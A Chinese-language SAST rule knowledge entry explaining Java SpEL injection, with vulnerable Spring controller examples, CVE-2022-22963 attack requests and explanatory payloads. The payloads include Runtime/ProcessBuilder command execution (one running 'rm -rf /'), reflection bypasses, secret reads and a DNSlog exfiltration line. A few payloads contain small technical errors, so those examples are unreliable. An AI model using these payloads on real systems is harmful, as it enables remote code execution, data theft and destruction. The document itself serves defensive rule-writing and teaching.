# Java SPEL注入漏洞

> 来源：ChanziSAST 规则库语义规则提取（知识整理，含中文漏洞详解）。
> 规则 ID：`any_spel_codei` · 类别：codei · 关键 sink：ExpressionParser, SpelExpressionParser, TemplateAwareExpressionParser, parseExpression
> 说明：原文为 cypher 语义查询（不可直接挂 semgrep），下方「知识正文」为规则自带的中文漏洞详解，
> 提取时未改写；配合 fortify-kingdom-reference 的定级指南与各语言 sink 手册使用。


## Java SPEL注入漏洞
SPEL（Spring Expression Language）是Spring框架内置的表达式语言，核心用于简化Spring生态中配置、数据绑定、权限控制等场景的动态表达式求值，其灵活的动态执行特性若被不当使用，会引发严重的SPEL注入漏洞——攻击者可通过构造恶意表达式，执行任意代码、读取/修改敏感数据、破坏应用逻辑，甚至完全控制服务器。

以下从**漏洞本质、触发条件、核心执行机制、典型场景、不同注入形态** 等维度完整描述SPEL注入漏洞：

## 一、漏洞本质
SPEL的核心是`ExpressionParser`（表达式解析器）、`EvaluationContext`（求值上下文）和表达式字符串三部分的协同执行：
1. 解析器负责将字符串形式的表达式解析为可执行的`Expression`对象；
2. 求值上下文定义表达式执行的环境（如可访问的变量、方法、类权限）；
3. 若表达式字符串包含用户可控的输入，且未做任何过滤/限制直接传入解析器执行，攻击者可构造恶意SPEL表达式，突破上下文限制执行任意操作。

SPEL本身并非“危险”，漏洞的核心是**用户输入未净化地进入SPEL解析流程**，且执行上下文未做最小权限限制。

## 二、SPEL的核心执行能力（注入的基础）
SPEL支持丰富的语法，这也是注入能实现多维度攻击的原因，核心语法包括：
1. **基础运算**：算术运算（`1+1`）、逻辑运算（`&&`/`||`）、比较运算（`==`/`>`）；
2. **对象访问**：通过`.`访问对象属性（如`user.name`）、通过`[]`访问集合（如`list[0]`）；
3. **方法调用**：直接调用对象方法（如`user.getName()`）；
4. **静态方法/类访问**：通过`T()`语法调用静态类和方法（如`T(java.lang.Runtime).getRuntime().exec("calc")`）；
5. **构造函数调用**：通过`new`创建对象（如`new java.io.File("/etc/passwd")`）；
6. **变量引用**：通过`#变量名`引用上下文变量（如`#user`）；
7. **根对象访问**：通过`#root`引用根对象，`#this`引用当前对象；
8. **内置工具类**：Spring内置的`#systemProperties`（系统属性）、`#environment`（环境变量）等。

这些能力被攻击者滥用时，可实现从信息泄露到代码执行的全链路攻击。

## 三、触发SPEL注入的核心条件
SPEL注入的发生需同时满足以下条件，缺一不可：
1. **输入可控**：SPEL表达式字符串中包含用户可修改的内容（如HTTP参数、Cookie、请求体、URL路径等）；
2. **直接解析执行**：应用将包含用户输入的表达式字符串直接传入`ExpressionParser.parseExpression()` + `Expression.getValue()`执行，未做任何过滤或转义；
3. **执行上下文权限过高**：求值上下文（如`StandardEvaluationContext`）未限制类访问、方法调用权限，默认情况下`StandardEvaluationContext`权限极高，可访问几乎所有Java类。

反之，若使用`SimpleEvaluationContext`（Spring 4.3+推出的最小权限上下文）且仅开放必要功能，即使表达式包含用户输入，注入风险也会大幅降低。

## 四、SPEL注入的典型场景
### 场景1：硬编码表达式中拼接用户输入（最常见）
应用开发时为简化逻辑，将用户输入直接拼接进SPEL表达式字符串，再传入解析器执行。
**示例代码**：
```java
@RestController
public class SpelInjectController {
    // SPEL解析器（通常单例）
    private static final ExpressionParser parser = new SpelExpressionParser();

    @GetMapping("/hello")
    public String hello(@RequestParam String name) {
        // 危险：将用户输入直接拼接进SPEL表达式
        String spelExpr = " 'Hello, ' + '" + name + "'";
        // 执行表达式
        Expression expression = parser.parseExpression(spelExpr);
        String result = expression.getValue(String.class);
        return result;
    }
}
```
**攻击利用**：攻击者传入`name`参数为：`${T(java.lang.Runtime).getRuntime().exec("rm -rf /")}` 或构造闭合：`";T(java.lang.Runtime).getRuntime().exec("calc");//`，拼接后的表达式变为：
`'Hello, ' + '';T(java.lang.Runtime).getRuntime().exec("calc");//'`，执行后触发任意命令执行。

### 场景2：配置/注解中使用SPEL引用用户输入
Spring生态中大量注解（如`@Value`、`@PreAuthorize`、`@Cacheable`）支持SPEL，若注解中的SPEL表达式引用了用户可控的变量，可能触发注入。

#### 子场景2.1：@PreAuthorize权限控制中的SPEL注入
`@PreAuthorize`用于方法级权限控制，其值为SPEL表达式，若表达式中直接使用用户输入（如`request.getParameter`），则存在风险：
```java
@RestController
public class AuthController {
    @PreAuthorize("hasRole('" + request.getParameter("role") + "')") // 伪代码，实际更隐蔽
    @GetMapping("/admin")
    public String admin() {
        return "admin page";
    }
}
```
**攻击利用**：攻击者传入`role`参数为：`admin') or T(java.lang.Runtime).getRuntime().exec("calc");//`，拼接后的SPEL表达式变为：
`hasRole('admin') or T(java.lang.Runtime).getRuntime().exec("calc");//')`，绕过权限控制并执行恶意代码。

#### 子场景2.2：@Value注解中的SPEL注入
`@Value`用于属性注入，若`@Value`的表达式包含用户可控的配置（如从外部配置文件/请求参数读取），可能触发注入：
```java
@Component
public class ValueInjectComponent {
    // 危险：若${spel.input}来自用户可控的配置/参数
    @Value("#{${spel.input}}")
    private String config;
}
```
若`spel.input`被攻击者控制为`T(java.lang.Runtime).getRuntime().exec("calc")`，则`@Value`解析时会执行该表达式。

### 场景3：框架/中间件内置的SPEL解析（间接注入）
部分Spring生态组件（如Spring Cloud、Spring Security、Spring Data）或第三方中间件，在处理特定请求时会隐式解析SPEL表达式，若用户输入被带入这些隐式解析流程，会触发注入。

#### 子场景3.1：Spring Cloud Function SPEL注入（CVE-2022-22963）
Spring Cloud Function允许通过`spring.cloud.function.routing-expression`参数指定SPEL表达式作为路由规则，若该参数可由用户控制，攻击者可构造恶意表达式执行代码：
**攻击请求**：
```http
POST /functionRouter HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("calc")

test=1
```
该漏洞的核心是框架将用户传入的`routing-expression`参数直接作为SPEL表达式解析执行。

#### 子场景3.2：Spring Security OAuth2 SPEL注入（历史漏洞）
早期Spring Security OAuth2在处理`scope`参数时，会将其作为SPEL表达式解析，攻击者可构造恶意`scope`值触发注入：
```http
POST /oauth/token HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded

grant_type=password&username=test&password=test&scope=T(java.lang.Runtime).getRuntime().exec("calc")
```

### 场景4：自定义SPEL上下文的注入
开发者自定义`EvaluationContext`时，若向上下文中注入了高权限对象（如`Runtime`、`ProcessBuilder`），或未限制上下文的类访问权限，即使表达式看似“简单”，也可能被利用：
```java
@GetMapping("/custom")
public String customContext(@RequestParam String expr) {
    ExpressionParser parser = new SpelExpressionParser();
    StandardEvaluationContext context = new StandardEvaluationContext();
    // 危险：向上下文注入Runtime对象
    context.setVariable("runtime", Runtime.getRuntime());
    // 执行用户可控的表达式
    String result = parser.parseExpression(expr).getValue(context, String.class);
    return result;
}
```
**攻击利用**：攻击者传入`expr=runtime.exec("calc")`，直接调用上下文中的`Runtime`对象执行命令。

## 五、SPEL注入的不同形态（按攻击效果分类）
### 形态1：信息泄露型注入
攻击者通过SPEL表达式读取敏感信息，无代码执行，但泄露核心数据：
- 读取系统属性：`T(java.lang.System).getProperty("user.dir")`、`T(java.lang.System).getProperty("java.home")`；
- 读取环境变量：`T(java.lang.System).getenv("PATH")`、`T(java.lang.System).getenv("SECRET_KEY")`；
- 读取Spring上下文Bean：`#applicationContext.getBean('userService').getAdminPassword()`；
- 读取请求/会话数据：`#request.getParameter("token")`、`#session.getAttribute("userInfo")`。

### 形态2：代码执行型注入（最危险）
攻击者通过SPEL执行任意Java代码，甚至系统命令：
#### 子形态2.1：直接调用Runtime执行命令
```spel
T(java.lang.Runtime).getRuntime().exec("cmd /c calc")
```
#### 子形态2.2：通过ProcessBuilder执行命令
```spel
new java.lang.ProcessBuilder(new java.lang.String[]{"cmd","/c","calc"}).start()
```
#### 子形态2.3：反射执行任意方法
```spel
T(java.lang.Class).forName("java.lang.Runtime").getMethod("exec",T(java.lang.String)).invoke(T(java.lang.Runtime).getRuntime(),"calc")
```
#### 子形态2.4：绕过限制的代码执行（如禁用Runtime）
若应用限制了`Runtime`类的访问，攻击者可通过反射、类加载器等方式绕过：
```spel
T(java.lang.Class).forName("java.lang.ProcessBuilder").getConstructor(T(java.lang.String[])).newInstance(new java.lang.String[]{"calc"}).start()
```

### 形态3：逻辑破坏型注入
攻击者不执行代码，而是通过SPEL表达式修改应用逻辑、绕过校验：
- 绕过权限校验：`@PreAuthorize`中注入`true`，如`expr=true`；
- 修改Bean属性：`#applicationContext.getBean('configService').setDebugMode(true)`；
- 破坏数据逻辑：`#userService.deleteAllUsers()`（若上下文可访问`userService`）；
- 触发异常：`T(java.lang.Integer).parseInt("abc")`，导致应用抛出异常，引发DoS。

### 形态4：无回显注入（盲注）
若注入点无直接输出，攻击者通过“时间盲注”或“DNSlog”验证注入是否成功：
#### 子形态4.1：时间盲注
```spel
T(java.lang.Thread).sleep(5000) // 延迟5秒，通过响应时间判断注入成功
```
#### 子形态4.2：DNSlog外带数据
```spel
T(java.net.InetAddress).getByName("${whoami}.xxx.dnslog.cn")
```
通过DNSlog平台查看解析记录，获取`whoami`的结果。

## 六、SPEL注入的特殊情况（易被忽视的场景）
### 情况1：SPEL表达式转义不彻底导致的注入
开发者试图转义SPEL中的特殊字符（如单引号、分号），但转义不彻底：
```java
// 错误的转义：仅替换单引号，未处理其他特殊字符
String safeExpr = " 'Hello, ' + '" + name.replace("'", "\\'") + "'";
```
**攻击利用**：攻击者传入`name=\';T(java.lang.Runtime).exec("calc");//`，转义后变为`\'`，拼接后的表达式为：
`'Hello, ' + '\';T(java.lang.Runtime).exec("calc");//'`，`\'`在SPEL中会被解析为单引号的转义，最终闭合字符串并执行恶意代码。

### 情况2：嵌套SPEL表达式注入
SPEL支持嵌套解析（如`#{${...}}`），若外层解析后的值仍包含SPEL表达式，会触发二次注入：
```java
// 第一次解析：读取配置中的spel.expr
String expr1 = environment.getProperty("spel.expr");
// 第二次解析：将expr1作为SPEL表达式执行
String result = parser.parseExpression(expr1).getValue(String.class);
```
若`spel.expr`被攻击者控制为`#{T(java.lang.Runtime).getRuntime().exec("calc")}`，第一次解析后得到`T(java.lang.Runtime).getRuntime().exec("calc")`，第二次解析执行该表达式。

### 情况3：低版本Spring的SPEL解析漏洞
早期Spring版本（如5.0.x以下）的SPEL解析器存在解析逻辑缺陷，即使输入看似无害，也可能被构造特殊语法触发注入：
- 例如：SPEL对`${}`和`#{}`的解析优先级问题，导致外部注入的`${}`被解析为SPEL表达式；
- 例如：对空值、特殊字符（如`\n`、`\r`）的处理不当，导致表达式闭合。

### 情况4：SPEL与其他注入的组合利用
SPEL注入可与SQL注入、XSS等组合，放大攻击效果：
- SPEL注入读取数据库连接信息 → 用于SQL注入；
- SPEL注入执行代码后写入WebShell → 持久化控制；
- SPEL注入读取JWT密钥 → 伪造Token绕过认证。

## 七、SPEL注入与EL注入的区别（易混淆点）
需注意SPEL≠JSP EL（Expression Language），二者核心区别：
1. 归属不同：SPEL是Spring框架专属，JSP EL是Java EE标准；
2. 语法不同：SPEL支持`T()`静态类调用、方法执行，JSP EL仅支持简单属性访问；
3. 执行环境不同：SPEL通过`ExpressionParser`执行，JSP EL通过`PageContext`执行；
4. 风险等级不同：SPEL可直接执行代码，JSP EL通常仅能读取信息（除非结合其他漏洞）。

综上，SPEL注入的核心风险在于“用户可控输入进入SPEL解析流程 + 高权限执行上下文”，其攻击形态覆盖信息泄露、代码执行、逻辑破坏等，且可利用Spring生态的各类场景实现注入，是Java应用中高危且易被忽视的漏洞类型。

